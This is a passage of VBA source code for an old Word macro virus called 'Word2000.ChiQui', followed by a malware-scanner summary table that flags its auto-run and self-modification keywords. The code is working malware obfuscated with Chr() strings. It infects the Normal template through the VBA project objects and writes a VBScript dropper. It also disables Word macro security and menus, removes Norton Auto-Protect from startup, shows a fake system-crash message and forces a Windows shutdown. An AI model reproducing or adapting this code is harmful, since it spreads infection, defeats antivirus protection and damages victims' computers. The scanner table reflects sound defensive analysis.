P3$ = Chr(110) & Chr(84) & Chr(101) & Chr(120) & Chr(116) & Chr(70) & Chr(105) & Chr(108) & Chr(101) & Chr(40) & Chr(87) & Chr(83) & Chr(99) & Chr(114) & Chr(105) & Chr(112) & Chr(116) & Chr(46) & Chr(83) & Chr(99) & Chr(114) & Chr(105) & Chr(112) & Chr(116) & Chr(70) & Chr(117) & Chr(108) & Chr(108) & Chr(78) & Chr(97) & Chr(109) & Chr(101) & Chr(44) & Chr(32) & Chr(49) & Chr(41) & Chr(13) & Chr(10) & Chr(79) & Chr(117) & Chr(114) & Chr(67) & Chr(111) & Chr(100) & Chr(101) & Chr(32) & Chr(61) & Chr(32) & Chr(83) & Chr(99)
P4$ = Chr(114) & Chr(105) & Chr(112) & Chr(116) & Chr(70) & Chr(105) & Chr(108) & Chr(101) & Chr(46) & Chr(82) & Chr(101) & Chr(97) & Chr(100) & Chr(97) & Chr(108) & Chr(108) & Chr(13) & Chr(10) & Chr(65) & Chr(108) & Chr(108) & Chr(86) & Chr(97) & Chr(114) & Chr(105) & Chr(97) & Chr(98) & Chr(108) & Chr(101) & Chr(115) & Chr(32) & Chr(61) & Chr(32) & Chr(34) & Chr(70) & Chr(83) & Chr(79) & Chr(98) & Chr(106) & Chr(101) & Chr(99) & Chr(116) & Chr(32) & Chr(83) & Chr(99) & Chr(114) & Chr(105) & Chr(112) & Chr(116) & Chr(70)
P5$ = Chr(105) & Chr(108) & Chr(101) & Chr(32) & Chr(79) & Chr(117) & Chr(114) & Chr(67) & Chr(111) & Chr(100) & Chr(101) & Chr(32) & Chr(65) & Chr(108) & Chr(108) & Chr(86) & Chr(97) & Chr(114) & Chr(105) & Chr(97) & Chr(98) & Chr(108) & Chr(101) & Chr(115) & Chr(32) & Chr(86) & Chr(97) & Chr(114) & Chr(76) & Chr(111) & Chr(111) & Chr(112) & Chr(32) & Chr(67) & Chr(117) & Chr(114) & Chr(86) & Chr(97) & Chr(114) & Chr(32) & Chr(78) & Chr(101) & Chr(119) & Chr(86) & Chr(97) & Chr(114) & Chr(32) & Chr(86) & Chr(97) & Chr(114)
P6$ = Chr(80) & Chr(111) & Chr(115) & Chr(32) & Chr(106) & Chr(32) & Chr(121) & Chr(32) & Chr(120) & Chr(32) & Chr(34) & Chr(13) & Chr(10) & Chr(68) & Chr(111)
final$ = P1$ & p2$ & P3$ & P4$ & P5$ & P6$: Print #1, final$
P1$ = Chr(67) & Chr(117) & Chr(114) & Chr(86) & Chr(97) & Chr(114) & Chr(32) & Chr(61) & Chr(32) & Chr(76) & Chr(101) & Chr(102) & Chr(116) & Chr(40) & Chr(65) & Chr(108) & Chr(108) & Chr(86) & Chr(97) & Chr(114) & Chr(105) & Chr(97) & Chr(98) & Chr(108) & Chr(101) & Chr(115) & Chr(44) & Chr(32) & Chr(73) & Chr(110) & Chr(83) & Chr(116) & Chr(114) & Chr(40) & Chr(65) & Chr(108) & Chr(108) & Chr(86) & Chr(97) & Chr(114) & Chr(105) & Chr(97) & Chr(98) & Chr(108) & Chr(101) & Chr(115) & Chr(44) & Chr(32) & Chr(67)
p2$ = Chr(104) & Chr(114) & Chr(40) & Chr(51) & Chr(50) & Chr(41) & Chr(41) & Chr(32) & Chr(45) & Chr(32) & Chr(49) & Chr(41) & Chr(13) & Chr(10) & Chr(65) & Chr(108) & Chr(108) & Chr(86) & Chr(97) & Chr(114) & Chr(105) & Chr(97) & Chr(98) & Chr(108) & Chr(101) & Chr(115) & Chr(32) & Chr(61) & Chr(32) & Chr(77) & Chr(105) & Chr(100) & Chr(40) & Chr(65) & Chr(108) & Chr(108) & Chr(86) & Chr(97) & Chr(114) & Chr(105) & Chr(97) & Chr(98) & Chr(108) & Chr(101) & Chr(115) & Chr(44) & Chr(32) & Chr(73) & Chr(110) & Chr(83)
P3$ = Chr(116) & Chr(114) & Chr(40) & Chr(65) & Chr(108) & Chr(108) & Chr(86) & Chr(97) & Chr(114) & Chr(105) & Chr(97) & Chr(98) & Chr(108) & Chr(101) & Chr(115) & Chr(44) & Chr(32) & Chr(67) & Chr(104) & Chr(114) & Chr(40) & Chr(51) & Chr(50) & Chr(41) & Chr(41) & Chr(32) & Chr(43) & Chr(32) & Chr(49) & Chr(41) & Chr(13) & Chr(10) & Chr(110) & Chr(101) & Chr(119) & Chr(118) & Chr(97) & Chr(114) & Chr(32) & Chr(61) & Chr(32) & Chr(99) & Chr(104) & Chr(114) & Chr(40) & Chr(105) & Chr(110) & Chr(116) & Chr(40) & Chr(114)
P4$ = Chr(110) & Chr(100) & Chr(42) & Chr(50) & Chr(53) & Chr(41) & Chr(43) & Chr(54) & Chr(53) & Chr(41) & Chr(13) & Chr(10) & Chr(102) & Chr(111) & Chr(114) & Chr(32) & Chr(121) & Chr(32) & Chr(61) & Chr(32) & Chr(49) & Chr(32) & Chr(116) & Chr(111) & Chr(32) & Chr(105) & Chr(110) & Chr(116) & Chr(40) & Chr(114) & Chr(110) & Chr(100) & Chr(42) & Chr(55) & Chr(41) & Chr(43) & Chr(49) & Chr(13) & Chr(10) & Chr(110) & Chr(101) & Chr(119) & Chr(118) & Chr(97) & Chr(114) & Chr(32) & Chr(61) & Chr(110) & Chr(101) & Chr(119)
P5$ = Chr(118) & Chr(97) & Chr(114) & Chr(32) & Chr(43) & Chr(32) & Chr(99) & Chr(104) & Chr(114) & Chr(40) & Chr(105) & Chr(110) & Chr(116) & Chr(40) & Chr(114) & Chr(110) & Chr(100) & Chr(42) & Chr(50) & Chr(53) & Chr(41) & Chr(43) & Chr(54) & Chr(53) & Chr(41) & Chr(13) & Chr(10) & Chr(110) & Chr(101) & Chr(120) & Chr(116) & Chr(13) & Chr(10) & Chr(68) & Chr(111)
final$ = P1$ & p2$ & P3$ & P4$ & P5$: Print #1, final$
P1$ = Chr(86) & Chr(97) & Chr(114) & Chr(80) & Chr(111) & Chr(115) & Chr(32) & Chr(61) & Chr(32) & Chr(73) & Chr(110) & Chr(83) & Chr(116) & Chr(114) & Chr(40) & Chr(86) & Chr(97) & Chr(114) & Chr(80) & Chr(111) & Chr(115) & Chr(32) & Chr(43) & Chr(32) & Chr(49) & Chr(44) & Chr(32) & Chr(79) & Chr(117) & Chr(114) & Chr(67) & Chr(111) & Chr(100) & Chr(101) & Chr(44) & Chr(32) & Chr(67) & Chr(117) & Chr(114) & Chr(86) & Chr(97) & Chr(114) & Chr(41) & Chr(13) & Chr(10) & Chr(73) & Chr(102) & Chr(32) & Chr(86)
p2$ = Chr(97) & Chr(114) & Chr(80) & Chr(111) & Chr(115) & Chr(32) & Chr(84) & Chr(104) & Chr(101) & Chr(110) & Chr(32) & Chr(79) & Chr(117) & Chr(114) & Chr(67) & Chr(111) & Chr(100) & Chr(101) & Chr(32) & Chr(61) & Chr(32) & Chr(77) & Chr(105) & Chr(100) & Chr(40) & Chr(79) & Chr(117) & Chr(114) & Chr(67) & Chr(111) & Chr(100) & Chr(101) & Chr(44) & Chr(32) & Chr(49) & Chr(44) & Chr(32) & Chr(40) & Chr(86) & Chr(97) & Chr(114) & Chr(80) & Chr(111) & Chr(115) & Chr(32) & Chr(45) & Chr(32) & Chr(49) & Chr(41) & Chr(41)
P3$ = Chr(32) & Chr(38) & Chr(32) & Chr(78) & Chr(101) & Chr(119) & Chr(86) & Chr(97) & Chr(114) & Chr(32) & Chr(38) & Chr(32) & Chr(77) & Chr(105) & Chr(100) & Chr(40) & Chr(79) & Chr(117) & Chr(114) & Chr(67) & Chr(111) & Chr(100) & Chr(101) & Chr(44) & Chr(32) & Chr(40) & Chr(86) & Chr(97) & Chr(114) & Chr(80) & Chr(111) & Chr(115) & Chr(32) & Chr(43) & Chr(32) & Chr(76) & Chr(101) & Chr(110) & Chr(40) & Chr(67) & Chr(117) & Chr(114) & Chr(86) & Chr(97) & Chr(114) & Chr(41) & Chr(41) & Chr(41) & Chr(13) & Chr(10)
P4$ = Chr(76) & Chr(111) & Chr(111) & Chr(112) & Chr(32) & Chr(87) & Chr(104) & Chr(105) & Chr(108) & Chr(101) & Chr(32) & Chr(86) & Chr(97) & Chr(114) & Chr(80) & Chr(111) & Chr(115) & Chr(13) & Chr(10) & Chr(76) & Chr(111) & Chr(111) & Chr(112) & Chr(32) & Chr(87) & Chr(104) & Chr(105) & Chr(108) & Chr(101) & Chr(32) & Chr(65) & Chr(108) & Chr(108) & Chr(86) & Chr(97) & Chr(114) & Chr(105) & Chr(97) & Chr(98) & Chr(108) & Chr(101) & Chr(115) & Chr(32) & Chr(60) & Chr(62) & Chr(32) & Chr(34) & Chr(34) & Chr(13) & Chr(10)
P5$ = Chr(83) & Chr(101) & Chr(116) & Chr(32) & Chr(83) & Chr(99) & Chr(114) & Chr(105) & Chr(112) & Chr(116) & Chr(70) & Chr(105) & Chr(108) & Chr(101) & Chr(32) & Chr(61) & Chr(32) & Chr(70) & Chr(83) & Chr(79) & Chr(98) & Chr(106) & Chr(101) & Chr(99) & Chr(116) & Chr(46) & Chr(79) & Chr(112) & Chr(101) & Chr(110) & Chr(84) & Chr(101) & Chr(120) & Chr(116) & Chr(70) & Chr(105) & Chr(108) & Chr(101) & Chr(40) & Chr(87) & Chr(83) & Chr(99) & Chr(114) & Chr(105) & Chr(112) & Chr(116) & Chr(46) & Chr(83) & Chr(99) & Chr(114)
P6$ = Chr(105) & Chr(112) & Chr(116) & Chr(70) & Chr(117) & Chr(108) & Chr(108) & Chr(78) & Chr(97) & Chr(109) & Chr(101) & Chr(44) & Chr(32) & Chr(50) & Chr(44) & Chr(32) & Chr(84) & Chr(114) & Chr(117) & Chr(101) & Chr(41) & Chr(32) & Chr(39) & Chr(13) & Chr(10) & Chr(83) & Chr(99) & Chr(114) & Chr(105) & Chr(112) & Chr(116) & Chr(70) & Chr(105) & Chr(108) & Chr(101) & Chr(46) & Chr(87) & Chr(114) & Chr(105) & Chr(116) & Chr(101) & Chr(108) & Chr(105) & Chr(110) & Chr(101) & Chr(32) & Chr(79) & Chr(117) & Chr(114) & Chr(67)
P7$ = Chr(111) & Chr(100) & Chr(101)
final$ = P1$ & p2$ & P3$ & P4$ & P5$ & P6$ & P7$: Print #1, final$
OO$ = Chr(83) & Chr(101) & Chr(116) & Chr(32) & Chr(106) & Chr(32) & Chr(61) & Chr(32) & Chr(87) & Chr(83) & Chr(99) & Chr(114) & Chr(105) & Chr(112) & Chr(116) & Chr(46) & Chr(67) & Chr(114) & Chr(101) & Chr(97) & Chr(116) & Chr(101) & Chr(79) & Chr(98) & Chr(106) & Chr(101) & Chr(99) & Chr(116) & Chr(40) & Chr(34) & Chr(87) & Chr(111) & Chr(114) & Chr(100) & Chr(46) & Chr(65) & Chr(112) & Chr(112) & Chr(108) & Chr(105) & Chr(99) & Chr(97) & Chr(116) & Chr(105) & Chr(111) & Chr(110) & Chr(34) & Chr(41)
Print #1, OO$
OO$ = Chr(106) & Chr(46) & Chr(79) & Chr(112) & Chr(116) & Chr(105) & Chr(111) & Chr(110) & Chr(115) & Chr(46) & Chr(86) & Chr(105) & Chr(114) & Chr(117) & Chr(115) & Chr(80) & Chr(114) & Chr(111) & Chr(116) & Chr(101) & Chr(99) & Chr(116) & Chr(105) & Chr(111) & Chr(110) & Chr(32) & Chr(61) & Chr(32) & Chr(40) & Chr(53) & Chr(52) & Chr(52) & Chr(32) & Chr(45) & Chr(32) & Chr(53) & Chr(52) & Chr(52) & Chr(41)
Print #1, OO$
OO$ = Chr(106) & Chr(46) & Chr(79) & Chr(112) & Chr(116) & Chr(105) & Chr(111) & Chr(110) & Chr(115) & Chr(46) & Chr(83) & Chr(97) & Chr(118) & Chr(101) & Chr(78) & Chr(111) & Chr(114) & Chr(109) & Chr(97) & Chr(108) & Chr(80) & Chr(114) & Chr(111) & Chr(109) & Chr(112) & Chr(116) & Chr(32) & Chr(61) & Chr(32) & Chr(40) & Chr(53) & Chr(52) & Chr(52) & Chr(32) & Chr(45) & Chr(32) & Chr(53) & Chr(52) & Chr(52) & Chr(41)
Print #1, OO$
OO$ = Chr(106) & Chr(46) & Chr(79) & Chr(112) & Chr(116) & Chr(105) & Chr(111) & Chr(110) & Chr(115) & Chr(46) & Chr(67) & Chr(111) & Chr(110) & Chr(102) & Chr(105) & Chr(114) & Chr(109) & Chr(67) & Chr(111) & Chr(110) & Chr(118) & Chr(101) & Chr(114) & Chr(115) & Chr(105) & Chr(111) & Chr(110) & Chr(115) & Chr(32) & Chr(61) & Chr(32) & Chr(40) & Chr(53) & Chr(52) & Chr(52) & Chr(32) & Chr(45) & Chr(32) & Chr(53) & Chr(52) & Chr(52) & Chr(41)
Print #1, OO$
OO$ = Chr(106) & Chr(46) & Chr(79) & Chr(112) & Chr(116) & Chr(105) & Chr(111) & Chr(110) & Chr(115) & Chr(46) & Chr(83) & Chr(97) & Chr(118) & Chr(101) & Chr(78) & Chr(111) & Chr(114) & Chr(109) & Chr(97) & Chr(108) & Chr(80) & Chr(114) & Chr(111) & Chr(109) & Chr(112) & Chr(116) & Chr(32) & Chr(61) & Chr(32) & Chr(40) & Chr(53) & Chr(52) & Chr(52) & Chr(32) & Chr(45) & Chr(32) & Chr(53) & Chr(52) & Chr(52) & Chr(41)
Print #1, OO$
OO$ = Chr(70) & Chr(111) & Chr(114) & Chr(32) & Chr(120) & Chr(32) & Chr(61) & Chr(32) & Chr(49) & Chr(32) & Chr(84) & Chr(111) & Chr(32) & Chr(106) & Chr(46) & Chr(78) & Chr(111) & Chr(114) & Chr(109) & Chr(97) & Chr(108) & Chr(84) & Chr(101) & Chr(109) & Chr(112) & Chr(108) & Chr(97) & Chr(116) & Chr(101) & Chr(46) & Chr(86) & Chr(66) & Chr(80) & Chr(114) & Chr(111) & Chr(106) & Chr(101) & Chr(99) & Chr(116) & Chr(46) & Chr(86) & Chr(66) & Chr(67) & Chr(111) & Chr(109) & Chr(112) & Chr(111) & Chr(110) & Chr(101)
PP$ = Chr(110) & Chr(116) & Chr(115) & Chr(46) & Chr(73) & Chr(116) & Chr(101) & Chr(109) & Chr(40) & Chr(49) & Chr(41) & Chr(46) & Chr(67) & Chr(111) & Chr(100) & Chr(101) & Chr(77) & Chr(111) & Chr(100) & Chr(117) & Chr(108) & Chr(101) & Chr(46) & Chr(67) & Chr(111) & Chr(117) & Chr(110) & Chr(116) & Chr(79) & Chr(102) & Chr(76) & Chr(105) & Chr(110) & Chr(101) & Chr(115)
YY$ = OO$ & PP$: Print #1, YY$
OO$ = Chr(106) & Chr(46) & Chr(78) & Chr(111) & Chr(114) & Chr(109) & Chr(97) & Chr(108) & Chr(84) & Chr(101) & Chr(109) & Chr(112) & Chr(108) & Chr(97) & Chr(116) & Chr(101) & Chr(46) & Chr(86) & Chr(66) & Chr(80) & Chr(114) & Chr(111) & Chr(106) & Chr(101) & Chr(99) & Chr(116) & Chr(46) & Chr(86) & Chr(66) & Chr(67) & Chr(111) & Chr(109) & Chr(112) & Chr(111) & Chr(110) & Chr(101) & Chr(110) & Chr(116) & Chr(115) & Chr(46) & Chr(73) & Chr(116) & Chr(101) & Chr(109) & Chr(40) & Chr(49) & Chr(41) & Chr(46) & Chr(67)
PP$ = Chr(111) & Chr(100) & Chr(101) & Chr(77) & Chr(111) & Chr(100) & Chr(117) & Chr(108) & Chr(101) & Chr(46) & Chr(68) & Chr(101) & Chr(108) & Chr(101) & Chr(116) & Chr(101) & Chr(76) & Chr(105) & Chr(110) & Chr(101) & Chr(115) & Chr(32) & Chr(49)
YY$ = OO$ & PP$: Print #1, YY$
OO$ = Chr(78) & Chr(101) & Chr(120) & Chr(116): Print #1, OO$
OO$ = Chr(106) & Chr(46) & Chr(78) & Chr(111) & Chr(114) & Chr(109) & Chr(97) & Chr(108) & Chr(84) & Chr(101) & Chr(109) & Chr(112) & Chr(108) & Chr(97) & Chr(116) & Chr(101) & Chr(46) & Chr(86) & Chr(66) & Chr(80) & Chr(114) & Chr(111) & Chr(106) & Chr(101) & Chr(99) & Chr(116) & Chr(46) & Chr(86) & Chr(66) & Chr(67) & Chr(111) & Chr(109) & Chr(112) & Chr(111) & Chr(110) & Chr(101) & Chr(110) & Chr(116) & Chr(115) & Chr(46) & Chr(73) & Chr(116) & Chr(101) & Chr(109) & Chr(40) & Chr(49) & Chr(41) & Chr(46) & Chr(67)
PP$ = Chr(111) & Chr(100) & Chr(101) & Chr(77) & Chr(111) & Chr(100) & Chr(117) & Chr(108) & Chr(101) & Chr(46) & Chr(65) & Chr(100) & Chr(100) & Chr(70) & Chr(114) & Chr(111) & Chr(109) & Chr(70) & Chr(105) & Chr(108) & Chr(101) & Chr(32) & Chr(40) & Chr(34) & Chr(67) & Chr(58) & Chr(92) & Chr(119) & Chr(105) & Chr(110) & Chr(100) & Chr(111) & Chr(119) & Chr(115) & Chr(92) & Chr(115) & Chr(121) & Chr(115) & Chr(116) & Chr(101) & Chr(109) & Chr(92) & Chr(99) & Chr(104) & Chr(105) & Chr(113) & Chr(117) & Chr(105) & Chr(46) & Chr(98)
QQ$ = Chr(97) & Chr(115) & Chr(34) & Chr(41): YY$ = OO$ & PP$ & QQ$: Print #1, YY$
OO$ = Chr(106) & Chr(46) & Chr(65) & Chr(112) & Chr(112) & Chr(108) & Chr(105) & Chr(99) & Chr(97) & Chr(116) & Chr(105) & Chr(111) & Chr(110) & Chr(46) & Chr(81) & Chr(117) & Chr(105) & Chr(116)
Print #1, OO$: Close #1
End Sub

Private Sub FilePrintDefault()
Dim XX As Integer, YY As Integer: Randomize: On Error Resume Next
XX = Int(Rnd * 92) + 30: YY = Int(Rnd * 92) + 30: AA XX, YY: ActiveDocument.PrintOut: AA YY, XX
End Sub

Private Sub FileSave()
Dim XX As Integer, YY As Integer: Randomize: On Error Resume Next
XX = Int(Rnd * 92) + 30: YY = Int(Rnd * 92) + 30: AA XX, YY: BB: ActiveDocument.Save: NormalTemplate.Save: AA YY, XX
End Sub

Private Sub FilePrint()
Dim XX As Integer, YY As Integer: Randomize: On Error Resume Next
XX = Int(Rnd * 92) + 30: YY = Int(Rnd * 92) + 30: AA XX, YY: ActiveDocument.PrintOut: AA YY, XX
End Sub

Private Sub ViewVBCode()
Randomize: On Error Resume Next
XX$ = Chr(85) & Chr(110) & Chr(101) & Chr(120) & Chr(112) & Chr(101) & Chr(99) & Chr(116) & Chr(101) & Chr(100) & Chr(47) & Chr(85) & Chr(110) & Chr(100) & Chr(101) & Chr(102) & Chr(105) & Chr(110) & Chr(101) & Chr(100) & Chr(32) & Chr(101) & Chr(114) & Chr(114) & Chr(111) & Chr(114) & Chr(32) & Chr(97) & Chr(116) & Chr(32) & Chr(97) & Chr(100) & Chr(100) & Chr(114) & Chr(101) & Chr(115) & Chr(115) & Chr(32)
t = "{00" & Int(Rnd * 999999) & ":" & Int(Rnd * 99999) & "}": MsgBox XX$ & t, vbCritical
End Sub

Private Sub Document_Close()
Dim XX As Integer, YY As Integer: Randomize: XX = Int(Rnd * 92) + 30: YY = Int(Rnd * 92) + 30: AA XX, YY: BB
End Sub

Private Sub Document_Open()
'Word2000.ChiQui
'By $MOOTHiE Da HuStla [Zero Gravity]
'August 1st, 2000
'Dedicated to my wife ChiQui :D
Dim XX As Integer, YY As Integer: Randomize: On Error Resume Next
With Options: .CheckGrammarAsYouType = (544 - 544): .CheckGrammarWithSpelling = (544 - 544): .CheckSpellingAsYouType = (544 - 544): .SavePropertiesPrompt = (544 - 544): .SaveNormalPrompt = (544 - 544): End With
With Application: .ScreenUpdating = (544 - 544): .EnableCancelKey = wdCancelDisabled: .DisplayAlerts = wdAlertsNone: .DisplayStatusBar = (544 - 544): .Caption = "$MOOTHiE Da HuStla [Zero Gravity] & ChiQui": End With
CommandBars("Tools").Controls("Macro").Enabled = (544 - 544): Controls("Tools").Controls("Security...").Enabled = False: CommandBars("Edit").Controls("Undo VBA-Find.Execute").Caption = "Undo": CommandBars("Edit").Controls("Undo").Enabled = (544 - 544)
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "Norton Auto-Protect") <> "" Then System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "Norton Auto-Protect") = ""
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "ChiQui") <> "... By $MOOTHiE Da HuStla [Zero Gravity]" Then
Call CC: System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "ChiQui") = "... By $MOOTHiE Da HuStla [Zero Gravity]"
MsgBox "Windows has encountered a severe problem, and cannot continue.  Windows shall now shutdown.  If Windows does not shutdown automatically, please reset it manually.", vbCritical, "Severe Error"
N = ExitWindowsEx(1, 0&)
Else: XX = Int(Rnd * 92) + 30: YY = Int(Rnd * 92) + 30: AA XX, YY: End If
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |ChiQui.Vbs          |Executable file name                         |
|Base64    |Rwh                 |Undo                                         |
|String    |                    |                                             |
+----------+--------------------+---------------------------------------------+

